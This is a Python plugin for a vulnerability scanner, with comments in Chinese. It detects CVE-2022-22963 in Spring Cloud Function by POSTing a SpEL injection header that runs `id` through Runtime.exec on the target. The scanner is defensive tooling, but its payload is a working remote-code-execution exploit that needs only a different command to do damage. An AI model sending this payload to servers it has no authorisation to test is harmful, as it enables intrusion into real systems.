from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("spring_cloud_function")


@register_scanner
class SpringCloudFunctionScanner(BaseScanner):
    name = "Spring Cloud Function SpEL RCE (CVE-2022-22963)"
    description = "Spring Cloud Function路由表达式注入导致RCE"
    category = "spring"
    module = "spring_cloud_function"
    risk_level = "critical"
    risk_score = 10
    cve_ids = ["CVE-2022-22963"]
    references = [
        "https://nvd.nist.gov/vuln/detail/CVE-2022-22963",
    ]
    fix_suggestion = "升级Spring Cloud Function至3.2.3+，限制functionRouter端点访问"

    def check(self) -> bool:
        url = f"{self.target}/functionRouter"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "spring.cloud.function.routing-expression": 'T(java.lang.Runtime).getRuntime().exec("id")',
        }
        resp = http_request("POST", url, data="test", headers=headers)
        if resp is None:
            return False

        indicators = ["uid=", "command", "exec", "Permission denied", "java.lang.UNIXProcess"]
        for indicator in indicators:
            if indicator in resp.text:
                self.add_result(
                    target_url=url,
                    detail="Spring Cloud Function SpEL注入成功",
                    payload='spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")',
                    request_data=f"POST {url}",
                    response_snippet=resp.text[:500],
                    evidence=f"响应包含特征: {indicator}",
                )
                return True

        if resp.status_code == 500 and "routing-expression" in resp.text.lower():
            self.add_result(
                name="Spring Cloud Function Routing Expression Detected",
                risk_level="high",
                risk_score=7,
                target_url=url,
                description="检测到Spring Cloud Function端点，可能存在SpEL注入",
                detail="服务端返回500错误且包含routing-expression关键字",
                response_snippet=resp.text[:500],
                evidence="500错误中包含routing-expression相关信息",
            )
            return True

        return False
